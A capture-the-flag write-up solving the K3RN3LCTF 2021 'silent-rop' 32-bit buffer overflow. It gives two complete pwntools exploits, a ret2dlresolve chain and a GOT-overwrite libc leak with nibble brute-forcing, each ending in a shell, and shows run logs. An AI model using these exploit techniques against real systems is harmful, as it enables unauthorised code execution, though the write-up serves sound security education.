# K3RN3LCTF 2021 

## silent-rop

> SILENCE ... can you still pwn this ? (no output is intended)
> 
> `nc ctf.k3rn3l4rmy.com 2202`
>
> Author: Bex
> 
> [`silent-rop`](silent-rop) [`libc.so.6`](libc.so.6)

Tags: _pwn_ _x86_ _bof_ _remote-shell_ _rop_ _ret2dlresolve_


## Summary

I'm not interested in writing a lengthly write up since this is just a ripoff of a challenge from other CTFs.  The short of it is, this is an easy 32-bit `read` _ret2dlresolve_ solve, however, for me, I could not get this working remotely, and I was not alone; many in their Discord reported the same and they had to restart the container multiple times.

However, that didn't stop me from just solving with a ROP chain--apparently that worked just find without a container restart.


## Exploit ret2dlresolve

```python
#!/usr/bin/env python3

from pwn import *

binary = context.binary = ELF('./silent-rop')
rop = ROP(binary)
dl = Ret2dlresolvePayload(binary, symbol='system', args=['/bin/sh'])

rop.read(0,dl.data_addr,len(dl.payload))
rop.ret2dlresolve(dl)

if args.REMOTE:
    p = remote('ctf.k3rn3l4rmy.com', 2202)
else:
    p = process(binary.path)

payload  = b''
payload += 0x1c * b'A'
payload += rop.chain()
payload += (0xd8 - len(payload)) * b'\0'
payload += dl.payload

p.send(payload)
p.interactive()
```

I suspect most just cut and pasted the first example from here: [https://docs.pwntools.com/en/stable/rop/ret2dlresolve.html](https://docs.pwntools.com/en/stable/rop/ret2dlresolve.html).

The code above is pretty much the same.

Local output:

```
# ./exploit.py
[*] '/pwd/datajerk/k3rn3lctf2021/silent-rop/silent-rop'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
[*] Loaded 10 cached gadgets for './silent-rop'
[+] Starting local process '/pwd/datajerk/k3rn3lctf2021/silent-rop/silent-rop': pid 55753
[*] Switching to interactive mode
$ cat flag.txt
flag{flag}
```

## Exploit ROP

```python
#!/usr/bin/env python3

from pwn import *

binary = context.binary = ELF('./silent-rop')

while True:
    if args.REMOTE:
        p = remote('ctf.k3rn3l4rmy.com', 2202)
        libc = ELF('libc.so.6', checksec=False)
    else:
        p = process(binary.path)
        libc = ELF('/lib/i386-linux-gnu/libc.so.6', checksec=False)

    payload  = b''
    payload += 0x1c * b'A'
    payload += p32(binary.plt.read)
    payload += p32(binary.sym.vuln)
    payload += p32(0)
    payload += p32(binary.got.setvbuf)
    payload += p32(2)
    payload += (0xd8 - len(payload)) * b'\0'

    p.send(payload)
    p.send(p16((libc.sym.puts & 0xFFF) | 0x6000))

    payload  = b''
    payload += 0x1c * b'A'
    payload += p32(binary.plt.setvbuf)
    payload += p32(binary.sym.vuln)
    payload += p32(binary.got.setvbuf)
    payload += (0xd8 - len(payload)) * b'\0'

    p.send(payload)
    try:
        _ = p.recv(4)
    except:
        p.close()
        continue

    break

libc.address = u32(_) - libc.sym.puts
log.info('libc.address = {x}'.format(x = hex(libc.address)))

payload  = b''
payload += 0x1c * b'A'
payload += p32(libc.sym.system)
payload += p32(0)
payload += p32(libc.search(b'/bin/sh').__next__())
payload += (0xd8 - len(payload)) * b'\0'

p.send(payload)
p.interactive()
```

The objective here is to change `setvbuf` to `puts` in the GOT.  A single nibble will need to be brute forced.  Setting the nibble to `6` will work 100% of the time without ASLR (used for dev and test).  With ASLR enabled there's a 1/16 chance this will work on each attempt.

If this is successful, then `setvbuf` will be `puts` and we can leak libc and then get a shell.

Output (worked on 7th iteration):

```bash
# ./exploit2.py REMOTE=1
[*] '/pwd/datajerk/k3rn3lctf2021/silent-rop/silent-rop'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
[+] Opening connection to ctf.k3rn3l4rmy.com on port 2202: Done
[*] Closed connection to ctf.k3rn3l4rmy.com port 2202
[+] Opening connection to ctf.k3rn3l4rmy.com on port 2202: Done
[*] Closed connection to ctf.k3rn3l4rmy.com port 2202
[+] Opening connection to ctf.k3rn3l4rmy.com on port 2202: Done
[*] Closed connection to ctf.k3rn3l4rmy.com port 2202
[+] Opening connection to ctf.k3rn3l4rmy.com on port 2202: Done
[*] Closed connection to ctf.k3rn3l4rmy.com port 2202
[+] Opening connection to ctf.k3rn3l4rmy.com on port 2202: Done
[*] Closed connection to ctf.k3rn3l4rmy.com port 2202
[+] Opening connection to ctf.k3rn3l4rmy.com on port 2202: Done
[*] Closed connection to ctf.k3rn3l4rmy.com port 2202
[+] Opening connection to ctf.k3rn3l4rmy.com on port 2202: Done
[*] libc.address = 0xf7d35000
[*] Switching to interactive mode

$ id
uid=1000 gid=1000 groups=1000
$ cat flag.txt
flag{r3t_2_dl_r3s0lve_d03s_n0t_n3ed_a_l34k}
```
